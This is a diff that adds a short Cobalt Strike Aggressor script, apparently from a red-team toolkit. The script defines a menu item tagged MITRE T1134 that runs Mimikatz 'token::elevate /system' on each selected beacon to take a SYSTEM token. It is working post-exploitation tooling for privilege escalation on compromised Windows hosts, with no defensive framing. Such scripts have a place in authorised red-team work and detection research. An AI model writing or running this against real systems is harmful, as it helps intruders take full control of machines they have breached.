@@ -1,0 +1,13 @@
+#Mimikatz Elevate to System Token
+item "Mimikatz - Elevate to System Token  - T1134"{
+	local('$bid');
+		foreach $bid ($1){
+			elevatesystem($bid);
+		}
+	}
+
+
+#Elevate to System Token
+sub elevatesystem{
+bmimikatz($1, "token::elevate /system");
+}
